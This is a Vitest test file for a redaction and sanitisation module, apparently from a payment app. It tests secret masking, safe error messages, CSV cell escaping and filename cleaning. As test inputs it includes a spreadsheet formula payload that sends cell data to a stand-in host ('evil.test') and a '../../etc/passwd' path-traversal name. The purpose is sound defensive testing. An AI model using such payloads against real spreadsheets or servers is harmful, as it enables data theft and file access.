import { describe, expect, it } from "vitest";
import {
  PublicError,
  REDACTED,
  errorCategory,
  maskTail,
  redactEmail,
  redactObject,
  redactProviderId,
  redactSecretsInText,
  safeFilename,
  sanitizeCsvValue,
  toCsvCell,
  toSafeError,
} from "./redaction";

describe("redactSecretsInText", () => {
  it("masks Stripe secret and restricted keys", () => {
    expect(redactSecretsInText("key=sk_test_ABCDEFGH12345678 end")).toBe(`key=${REDACTED} end`);
    expect(redactSecretsInText("key=sk_live_ABCDEFGH12345678 end")).toBe(`key=${REDACTED} end`);
    expect(redactSecretsInText("key=rk_live_ABCDEFGH12345678 end")).toBe(`key=${REDACTED} end`);
  });

  it("masks Stripe publishable keys", () => {
    expect(redactSecretsInText("key=pk_test_ABCDEFGH12345678 end")).toBe(`key=${REDACTED} end`);
    expect(redactSecretsInText("key=pk_live_ABCDEFGH12345678 end")).toBe(`key=${REDACTED} end`);
  });

  it("masks webhook signing secrets", () => {
    expect(redactSecretsInText("sig=whsec_ABCDEFGH12345678 end")).toBe(`sig=${REDACTED} end`);
  });

  it("masks bearer tokens, case-insensitively", () => {
    expect(redactSecretsInText("Authorization: Bearer abc123.def-ghi== rest")).toBe(
      `Authorization: ${REDACTED} rest`,
    );
    expect(redactSecretsInText("authorization: bearer abc123def")).toBe(
      `authorization: ${REDACTED}`,
    );
  });

  it("masks Slack webhook URLs", () => {
    expect(
      redactSecretsInText("hook https://hooks.slack.com/services/T000/B000/XXXXYYYY here"),
    ).toBe(`hook ${REDACTED} here`);
  });

  it("masks every occurrence, not just the first", () => {
    const out = redactSecretsInText(
      "a sk_test_ABCDEFGH12345678 b sk_live_ZZZZZZZZ99999999 c whsec_QQQQQQQQ11111111",
    );
    expect(out).toBe(`a ${REDACTED} b ${REDACTED} c ${REDACTED}`);
    expect(out).not.toMatch(/sk_|whsec_/);
  });

  it("leaves ordinary text and non-secret identifiers alone", () => {
    expect(redactSecretsInText("payment pi_3ABCdef succeeded for cus_XYZ")).toBe(
      "payment pi_3ABCdef succeeded for cus_XYZ",
    );
    expect(redactSecretsInText("")).toBe("");
  });

  it("does not mask a too-short key-shaped token", () => {
    // Fewer than 8 characters after the prefix is not key-shaped.
    expect(redactSecretsInText("sk_test_abc")).toBe("sk_test_abc");
  });
});

describe("maskTail / redactProviderId / redactEmail", () => {
  it("reveals at most the last four characters", () => {
    expect(maskTail("abcdefghij")).toBe(`${REDACTED}ghij`);
    expect(maskTail("abcdefghij", 2)).toBe(`${REDACTED}ij`);
  });

  it("reveals nothing at all for a short value", () => {
    expect(maskTail("abcd")).toBe(REDACTED);
    expect(maskTail("a")).toBe(REDACTED);
    expect(maskTail("")).toBe(REDACTED);
  });

  it("keeps the operationally useful provider id prefix only", () => {
    expect(redactProviderId("pi_1234567890")).toBe("pi_12…7890");
    expect(redactProviderId("1234567890")).toBe(`${REDACTED}7890`);
    expect(redactProviderId(null)).toBeNull();
    expect(redactProviderId(undefined)).toBeNull();
    expect(redactProviderId("")).toBeNull();
  });

  it("keeps an email recognisable without revealing the local part", () => {
    expect(redactEmail("john.doe@example.com")).toBe("j*******@example.com");
    expect(redactEmail("a@b.com")).toBe("a*@b.com");
    expect(redactEmail("nope")).toBe(REDACTED);
    expect(redactEmail("@example.com")).toBe(REDACTED);
    expect(redactEmail(null)).toBeNull();
  });
});

describe("redactObject", () => {
  it("redacts sensitive keys at any depth", () => {
    expect(
      redactObject({
        ok: "visible",
        password: "hunter2",
        nested: { api_key: "abc", deeper: { authorization: "Basic xyz", session: "s" } },
      }),
    ).toEqual({
      ok: "visible",
      password: REDACTED,
      nested: { api_key: REDACTED, deeper: { authorization: REDACTED, session: REDACTED } },
    });
  });

  it("covers the documented sensitive key vocabulary", () => {
    const keys = [
      "password",
      "passwd",
      "secret",
      "token",
      "api_key",
      "api-key",
      "apiKey",
      "authorization",
      "auth",
      "cookie",
      "session",
      "credential",
      "private_key",
      "encryption_key",
      "webhook_url",
      "signature",
      "otp",
      "pin",
      "cvv",
      "card_number",
      "iban",
      "ssn",
      "STRIPE_SECRET_KEY",
    ];
    for (const key of keys) {
      expect(redactObject({ [key]: "leak-me" }), key).toEqual({ [key]: REDACTED });
    }
  });

  it("scans free-text values for credential shapes even under a harmless key", () => {
    expect(redactObject({ note: "used sk_test_ABCDEFGH12345678 today" })).toEqual({
      note: `used ${REDACTED} today`,
    });
  });

  it("stops recursing past the depth limit", () => {
    const deep = { l1: { l2: { l3: { l4: { l5: { l6: { l7: { l8: "deep" } } } } } } } };
    expect(redactObject(deep)).toEqual({
      l1: { l2: { l3: { l4: { l5: { l6: { l7: "[truncated: max depth]" } } } } } },
    });
    expect(JSON.stringify(redactObject(deep))).not.toContain("deep");
  });

  it("survives a cyclic structure instead of hanging", () => {
    const cyclic: Record<string, unknown> = { name: "root" };
    cyclic.self = cyclic;
    const out = JSON.stringify(redactObject(cyclic));
    expect(out).toContain("[truncated: max depth]");
  });

  it("truncates a long array and says how much was dropped", () => {
    const out = redactObject(Array.from({ length: 55 }, (_, i) => i)) as unknown[];
    expect(out).toHaveLength(51);
    expect(out[49]).toBe(49);
    expect(out[50]).toBe("[truncated: 5 more]");
  });

  it("does not annotate an array that fits", () => {
    expect(redactObject([1, 2, 3])).toEqual([1, 2, 3]);
    expect(redactObject(Array.from({ length: 50 }, () => 0))).toHaveLength(50);
  });

  it("truncates a long string", () => {
    const out = redactObject("z".repeat(600)) as string;
    expect(out).toHaveLength(512 + "…[truncated]".length);
    expect(out.endsWith("…[truncated]")).toBe(true);
    expect(redactObject("z".repeat(512))).toHaveLength(512);
  });

  it("renders a bigint as an exact string, never a number", () => {
    const out = redactObject({ amount: 9007199254740993n }) as { amount: unknown };
    expect(out.amount).toBe("9007199254740993");
    expect(typeof out.amount).toBe("string");
  });

  it("renders a Date as an ISO string", () => {
    expect(redactObject({ at: new Date("2026-03-01T12:00:00Z") })).toEqual({
      at: "2026-03-01T12:00:00.000Z",
    });
  });

  it("reduces an Error to its redacted message", () => {
    expect(redactObject(new Error("boom sk_test_ABCDEFGH12345678"))).toBe(`boom ${REDACTED}`);
  });

  it("normalises values that cannot be serialised safely", () => {
    expect(redactObject(undefined)).toBeNull();
    expect(redactObject(null)).toBeNull();
    expect(redactObject({ n: Number.NaN, i: Number.POSITIVE_INFINITY })).toEqual({
      n: null,
      i: null,
    });
    expect(redactObject({ fn: () => 1 })).toEqual({ fn: "[unserialisable]" });
    expect(redactObject({ ok: true, no: false })).toEqual({ ok: true, no: false });
  });
});

describe("toSafeError", () => {
  it("keeps a PublicError's code, message and status", () => {
    const error = new PublicError("invalid_csv", "Row 4 is missing a currency.", 422);
    expect(toSafeError(error)).toEqual({
      code: "invalid_csv",
      message: "Row 4 is missing a currency.",
      status: 422,
    });
  });

  it("defaults a PublicError to status 400", () => {
    expect(toSafeError(new PublicError("bad_request", "Nope")).status).toBe(400);
  });

  it("still redacts credentials inside a PublicError message", () => {
    const view = toSafeError(new PublicError("bad_key", "Key sk_test_ABCDEFGH12345678 rejected"));
    expect(view.message).toBe(`Key ${REDACTED} rejected`);
    expect(view.message).not.toContain("sk_test");
  });

  it("replaces a plain Error with a generic 500 and leaks NOTHING of the original", () => {
    const secretMessage = "connect ECONNREFUSED 10.0.0.5:5432 password=hunter2 for user payrecon";
    const view = toSafeError(new Error(secretMessage));

    expect(view.status).toBe(500);
    expect(view.code).toBe("internal_error");
    expect(view.message).toBe(
      "Something went wrong. Please try again, or contact support if it persists.",
    );

    const serialised = JSON.stringify(view);
    expect(serialised).not.toContain(secretMessage);
    for (const fragment of ["ECONNREFUSED", "10.0.0.5", "hunter2", "payrecon", "5432"]) {
      expect(serialised, fragment).not.toContain(fragment);
    }
  });

  it("does not leak a stack trace", () => {
    const view = toSafeError(new TypeError("cannot read property 'id' of undefined"));
    expect(JSON.stringify(view)).not.toContain("redaction.test");
    expect(Object.keys(view).sort()).toEqual(["code", "message", "status"]);
  });

  it("handles thrown non-Errors", () => {
    for (const thrown of ["a string", 42, null, undefined, { weird: true }]) {
      const view = toSafeError(thrown);
      expect(view.status).toBe(500);
      expect(view.code).toBe("internal_error");
    }
  });

  it("categorises errors without recording their content", () => {
    expect(errorCategory(new PublicError("rate_limited", "Slow down"))).toBe("rate_limited");
    expect(errorCategory(new TypeError("secret detail"))).toBe("TypeError");
    expect(errorCategory(new Error("secret detail"))).toBe("Error");
    expect(errorCategory("nope")).toBe("unknown");
  });
});

describe("sanitizeCsvValue", () => {
  it("neutralises every formula-triggering leading character", () => {
    expect(sanitizeCsvValue("=1+1")).toBe("'=1+1");
    expect(sanitizeCsvValue("+1")).toBe("'+1");
    expect(sanitizeCsvValue("-1")).toBe("'-1");
    expect(sanitizeCsvValue("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(sanitizeCsvValue("\tvalue")).toBe("'\tvalue");
    expect(sanitizeCsvValue("\rvalue")).toBe("'\rvalue");
  });

  it("neutralises the classic exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.test?x="&A1,"click")';
    expect(sanitizeCsvValue(payload).startsWith("'=")).toBe(true);
  });

  it("leaves ordinary values untouched", () => {
    expect(sanitizeCsvValue("hello")).toBe("hello");
    expect(sanitizeCsvValue("10.50")).toBe("10.50");
    expect(sanitizeCsvValue("pi_123")).toBe("pi_123");
    // Only a LEADING trigger character matters.
    expect(sanitizeCsvValue("a=b")).toBe("a=b");
    expect(sanitizeCsvValue("a-b")).toBe("a-b");
  });

  it("maps nullish and empty input to an empty cell", () => {
    expect(sanitizeCsvValue(null)).toBe("");
    expect(sanitizeCsvValue(undefined)).toBe("");
    expect(sanitizeCsvValue("")).toBe("");
  });
});

describe("toCsvCell", () => {
  it("quotes and doubles embedded quotes", () => {
    expect(toCsvCell('a"b')).toBe('"a""b"');
    expect(toCsvCell('a"b,c')).toBe('"a""b,c"');
  });

  it("quotes values containing a comma or a newline", () => {
    expect(toCsvCell("a,b")).toBe('"a,b"');
    expect(toCsvCell("a\nb")).toBe('"a\nb"');
    expect(toCsvCell("a\r\nb")).toBe('"a\r\nb"');
  });

  it("applies formula protection before quoting", () => {
    expect(toCsvCell("=1+1")).toBe("'=1+1");
    expect(toCsvCell("=1,2")).toBe('"\'=1,2"');
    expect(toCsvCell("\rvalue")).toBe('"\'\rvalue"');
  });

  it("leaves a plain value unquoted", () => {
    expect(toCsvCell("hello")).toBe("hello");
    expect(toCsvCell(null)).toBe("");
  });
});

describe("safeFilename", () => {
  it("strips directory separators", () => {
    expect(safeFilename("../../etc/passwd")).toBe("_.._etc_passwd");
    expect(safeFilename("a/b/c.csv")).toBe("a_b_c.csv");
    expect(safeFilename("a\\b\\c.csv")).toBe("a_b_c.csv");
    expect(safeFilename("C:\\Windows\\system32")).toBe("C:_Windows_system32");
  });

  it("strips leading dots so hidden files cannot be produced", () => {
    expect(safeFilename(".hidden")).toBe("hidden");
    expect(safeFilename("...hidden.csv")).toBe("hidden.csv");
    expect(safeFilename("..")).toBe("export.csv");
  });

  it("strips control characters", () => {
    expect(safeFilename("a\u0000b\u001fc\u007fd.csv")).toBe("abcd.csv");
    expect(safeFilename("report\r\n.csv")).toBe("report.csv");
  });

  it("falls back when nothing usable remains", () => {
    expect(safeFilename("")).toBe("export.csv");
    expect(safeFilename("   ")).toBe("export.csv");
    expect(safeFilename("...")).toBe("export.csv");
    expect(safeFilename(String.fromCharCode(0, 1, 31, 127))).toBe("export.csv");
    expect(safeFilename("/")).toBe("_"); // a separator becomes a legitimate name
    expect(safeFilename("", "exceptions.csv")).toBe("exceptions.csv");
  });

  it("bounds the length", () => {
    expect(safeFilename("y".repeat(500))).toHaveLength(120);
  });

  it("keeps a reasonable name intact", () => {
    expect(safeFilename("exceptions-2026-03-01.csv")).toBe("exceptions-2026-03-01.csv");
  });
});
